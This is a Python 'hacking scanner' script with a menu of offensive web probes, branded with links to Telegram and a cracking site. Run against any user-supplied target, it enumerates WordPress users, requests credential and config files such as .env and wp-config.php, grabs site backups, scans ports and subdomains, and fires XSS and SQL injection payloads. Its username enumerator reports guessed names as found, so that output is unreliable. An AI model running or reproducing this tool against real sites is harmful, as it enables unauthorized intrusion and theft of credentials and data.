#!/usr/bin/env python3
"""
DarkBoss1BD Hacking Scanner
A comprehensive penetration testing tool for the modern web
Coded by DarkBoss1BD
"""

import os
import sys
import time
import socket
import requests
import threading
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class DarkBossScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def banner(self):
        print(f"""{Colors.RED}
    ██████╗  █████╗ ██████╗ ██╗  ██╗██████╗  ██████╗ ███████╗███████╗██████╗ 
    ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔════╝ ██╔════╝██╔════╝╚════██╗
    ██║  ██║███████║██████╔╝█████╔╝ ██████╔╝██║  ███╗███████╗█████╗    ▄███╔╝
    ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══██╗██║   ██║╚════██║██╔══╝    ▀▀══╝ 
    ██████╔╝██║  ██║██║  ██║██║  ██╗██████╔╝╚██████╔╝███████║███████╗  ██╗   
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝╚══════╝  ╚═╝   
    {Colors.CYAN}
    ╔═══════════════════════════════════════════════════════════════════════╗
    ║                        DARKBOSS1BD SCANNER v2.0                       ║
    ║                 Advanced Web Application Security Tool                ║
    ╚═══════════════════════════════════════════════════════════════════════╝
    
    {Colors.YELLOW}[+] Telegram: https://t.me/darkvaiadmin
    {Colors.YELLOW}[+] Channel: https://t.me/windowspremiumkey
    {Colors.YELLOW}[+] Website: https://crackyworld.com/
    {Colors.END}
        """)
    
    def print_success(self, message):
        print(f"{Colors.GREEN}[+] {message}{Colors.END}")
    
    def print_error(self, message):
        print(f"{Colors.RED}[-] {message}{Colors.END}")
    
    def print_warning(self, message):
        print(f"{Colors.YELLOW}[!] {message}{Colors.END}")
    
    def print_info(self, message):
        print(f"{Colors.BLUE}[*] {message}{Colors.END}")
    
    def wordpress_username_enum(self):
        self.print_info("WordPress Username Enumeration Started")
        url = input(f"{Colors.CYAN}[?] Enter WordPress site URL (e.g., example.com): {Colors.END}").strip()
        
        if not url.startswith('http'):
            url = 'http://' + url
        
        common_usernames = ['admin', 'administrator', 'root', 'test', 'demo', 'user', 'wpadmin', 'wordpress']
        found_users = []
        
        self.print_info("Enumerating WordPress users...")
        
        for i, username in enumerate(common_usernames, 1):
            try:
                author_url = f"{url}/?author={i}"
                response = self.session.get(author_url, allow_redirects=True, timeout=10)
                
                if response.status_code == 200 and 'author' in response.url:
                    found_users.append(username)
                    self.print_success(f"Found user: {username}")
                elif response.status_code in [301, 302]:
                    found_users.append(username)
                    self.print_success(f"Found user: {username} (Redirect detected)")
                    
            except Exception as e:
                continue
        
        if found_users:
            self.print_success(f"Enumeration completed! Found {len(found_users)} users: {', '.join(found_users)}")
        else:
            self.print_error("No users found or enumeration failed")
    
    def sensitive_file_detector(self):
        self.print_info("Sensitive File Detection Started")
        url = input(f"{Colors.CYAN}[?] Enter target URL (e.g., example.com): {Colors.END}").strip()
        
        if not url.startswith('http'):
            url = 'http://' + url
        
        sensitive_files = [
            '/.htaccess', '/.htpasswd', '/robots.txt', '/sitemap.xml',
            '/backup.zip', '/database.sql', '/config.php', '/wp-config.php',
            '/admin/', '/phpinfo.php', '/test.php', '/debug.php',
            '/.git/config', '/backup.tar', '/dump.sql', '/web.config',
            '/.env', '/config.json', '/backup.sql', '/admin.php'
        ]
        
        found_files = []
        
        for file_path in sensitive_files:
            try:
                full_url = url + file_path
                response = self.session.get(full_url, timeout=8)
                
                if response.status_code == 200:
                    found_files.append(file_path)
                    self.print_success(f"Found: {file_path} (Status: 200)")
                elif response.status_code == 403:
                    self.print_warning(f"Access forbidden: {file_path} (Status: 403)")
                elif response.status_code == 401:
                    self.print_warning(f"Unauthorized: {file_path} (Status: 401)")
                    
            except Exception as e:
                continue
        
        if found_files:
            self.print_success(f"Scan completed! Found {len(found_files)} sensitive files")
        else:
            self.print_error("No sensitive files found")
    
    def subdomain_scanner(self):
        self.print_info("Subdomain Scanner Started")
        domain = input(f"{Colors.CYAN}[?] Enter domain (e.g., example.com): {Colors.END}").strip()
        
        subdomains = [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
            'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test',
            'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn',
            'api', 'apps', 'app', 'exchange', 'owa', 'en', 'shop', 'demo', 'portal',
            'host', 'remote', 'server', 'cdn', 'static', 'img', 'images', 'files',
            'download', 'upload', 'support', 'help', 'docs', 'wiki', 'status'
        ]
        
        found_subdomains = []
        
        def check_subdomain(sub):
            try:
                target = f"{sub}.{domain}"
                socket.gethostbyname(target)
                found_subdomains.append(target)
                self.print_success(f"Found: {target}")
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check_subdomain, subdomains)
        
        if found_subdomains:
            self.print_success(f"Scan completed! Found {len(found_subdomains)} subdomains")
        else:
            self.print_error("No subdomains found")
    
    def port_scanner(self):
        self.print_info("Port Scanner Started")
        target = input(f"{Colors.CYAN}[?] Enter target IP or hostname: {Colors.END}").strip()
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 8080, 8443, 3306, 5432, 27017, 1433, 3389]
        
        open_ports = []
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target, port))
                sock.close()
                if result == 0:
                    open_ports.append(port)
                    self.print_success(f"Port {port} is open")
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(scan_port, common_ports)
        
        if open_ports:
            self.print_success(f"Scan completed! Found {len(open_ports)} open ports: {sorted(open_ports)}")
        else:
            self.print_error("No open ports found")
    
    def wordpress_scanner(self):
        self.print_info("WordPress Scanner Started")
        url = input(f"{Colors.CYAN}[?] Enter WordPress site URL (e.g., example.com): {Colors.END}").strip()
        
        if not url.startswith('http'):
            url = 'http://' + url
        
        wp_indicators = [
            '/wp-admin/', '/wp-login.php', '/wp-content/', '/wp-includes/',
            '/readme.html', '/xmlrpc.php', '/wp-json/', '/wp-config.php',
            '/license.txt', '/wp-signup.php', '/wp-cron.php'
        ]
        
        found_indicators = []
        
        for indicator in wp_indicators:
            try:
                response = self.session.get(url + indicator, timeout=10)
                if response.status_code == 200:
                    found_indicators.append(indicator)
                    self.print_success(f"WordPress indicator found: {indicator}")
                elif response.status_code in [301, 302]:
                    found_indicators.append(indicator)
                    self.print_success(f"WordPress indicator found: {indicator} (Redirect)")
            except:
                continue
        
        if found_indicators:
            self.print_success(f"WordPress detected! Found {len(found_indicators)} indicators")
        else:
            self.print_error("No WordPress indicators found")
    
    def xss_scanner(self):
        self.print_info("XSS Scanner Started")
        url = input(f"{Colors.CYAN}[?] Enter target URL with parameter (e.g., http://example.com/search?q=test): {Colors.END}").strip()
        
        if '?' not in url:
            self.print_error("URL must contain parameters (?)")
            return
        
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '" onmouseover="alert(\'XSS\')',
            '<body onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">'
        ]
        
        vulnerable = False
        base_url = url.split('?')[0]
        query_string = url.split('?')[1]
        params = urllib.parse.parse_qs(query_string)
        
        for param_name in params.keys():
            for payload in xss_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    encoded_params = urllib.parse.urlencode(test_params, doseq=True)
                    test_url = f"{base_url}?{encoded_params}"
                    
                    response = self.session.get(test_url, timeout=10)
                    
                    if payload in response.text:
                        vulnerable = True
                        self.print_warning(f"Possible XSS vulnerability in parameter: {param_name}")
                        self.print_warning(f"Payload: {payload}")
                        break
                        
                except Exception as e:
                    continue
        
        if not vulnerable:
            self.print_error("No XSS vulnerabilities detected")
        else:
            self.print_success("XSS scan completed")
    
    def wordpress_backup_grabber(self):
        self.print_info("WordPress Backup Grabber Started")
        url = input(f"{Colors.CYAN}[?] Enter WordPress site URL (e.g., example.com): {Colors.END}").strip()
        
        if not url.startswith('http'):
            url = 'http://' + url
        
        backup_files = [
            '/wp-content/backup.zip', '/backup.zip', '/wp-backup.zip',
            '/database.sql', '/wp-content/database.sql', '/backup.sql',
            '/wp-content/backup.sql', '/wp.bak', '/backup.tar.gz',
            '/wp-content/backup.tar.gz', '/site.zip', '/website.zip',
            '/wp-content/uploads/backup.zip', '/wp-config.php.bak',
            '/wp-content/backup-db.sql', '/sql-backup.zip'
        ]
        
        found_backups = []
        
        for backup in backup_files:
            try:
                response = self.session.get(url + backup, timeout=10)
                if response.status_code == 200:
                    found_backups.append(backup)
                    self.print_success(f"Backup file found: {backup}")
            except:
                continue
        
        if found_backups:
            self.print_success(f"Found {len(found_backups)} backup files")
        else:
            self.print_error("No backup files found")
    
    def sql_injection_scanner(self):
        self.print_info("SQL Injection Scanner Started")
        url = input(f"{Colors.CYAN}[?] Enter target URL with parameter (e.g., http://example.com/product?id=1): {Colors.END}").strip()
        
        if '?' not in url:
            self.print_error("URL must contain parameters (?)")
            return
        
        sql_payloads = [
            "'", "''", "`", "``", "\\", 
            "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
            "admin'--", "admin'#", "admin'/*",
            "' AND 1=1--", "' AND 1=1#",
            "' UNION SELECT 1,2,3--", "' UNION SELECT 1,2,3#"
        ]
        
        vulnerable = False
        base_url = url.split('?')[0]
        query_string = url.split('?')[1]
        params = urllib.parse.parse_qs(query_string)
        
        for param_name in params.keys():
            for payload in sql_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    encoded_params = urllib.parse.urlencode(test_params, doseq=True)
                    test_url = f"{base_url}?{encoded_params}"
                    
                    response = self.session.get(test_url, timeout=10)
                    
                    sql_errors = [
                        "mysql_fetch_array()", "mysql_num_rows()", "You have an error in your SQL syntax",
                        "Microsoft OLE DB Provider", "ODBC Driver", "Unclosed quotation mark",
                        "SQLServer JDBC Driver", "ORA-", "PostgreSQL", "SQLite", "Warning: mysql",
                        "SQL syntax", "MySQL server", "syntax error"
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            vulnerable = True
                            self.print_warning(f"Possible SQLi vulnerability in parameter: {param_name}")
                            self.print_warning(f"Payload: {payload}")
                            self.print_warning(f"Error detected: {error}")
                            break
                            
                except Exception as e:
                    continue
        
        if not vulnerable:
            self.print_error("No SQL injection vulnerabilities detected")
        else:
            self.print_success("SQL injection scan completed")
    
    def menu(self):
        while True:
            self.clear_screen()
            self.banner()
            
            print(f"""
    {Colors.CYAN}-- Menu --{Colors.END}
    
    {Colors.GREEN}1. WordPress Username Enumerator
    {Colors.GREEN}2. Sensitive File Detector
    {Colors.GREEN}3. Sub-Domain Scanner
    {Colors.GREEN}4. Port Scanner
    {Colors.GREEN}5. WordPress Scanner
    {Colors.GREEN}6. Cross-Site Scripting [XSS] Scanner
    {Colors.GREEN}7. WordPress Backup Grabber
    {Colors.GREEN}8. SQL Injection [SQLI] Scanner
    {Colors.RED}0. Exit{Colors.END}
            """)
            
            choice = input(f"{Colors.YELLOW}[+] Select Option: {Colors.END}").strip()
            
            if choice == '1':
                self.wordpress_username_enum()
            elif choice == '2':
                self.sensitive_file_detector()
            elif choice == '3':
                self.subdomain_scanner()
            elif choice == '4':
                self.port_scanner()
            elif choice == '5':
                self.wordpress_scanner()
            elif choice == '6':
                self.xss_scanner()
            elif choice == '7':
                self.wordpress_backup_grabber()
            elif choice == '8':
                self.sql_injection_scanner()
            elif choice == '0':
                self.print_info("Thank you for using DarkBoss1BD Scanner!")
                sys.exit()
            else:
                self.print_error("Invalid option!")
            
            input(f"\n{Colors.CYAN}[Press Enter to continue...]{Colors.END}")

if __name__ == "__main__":
    try:
        scanner = DarkBossScanner()
        scanner.menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Scanner interrupted by user.{Colors.END}")
        sys.exit()
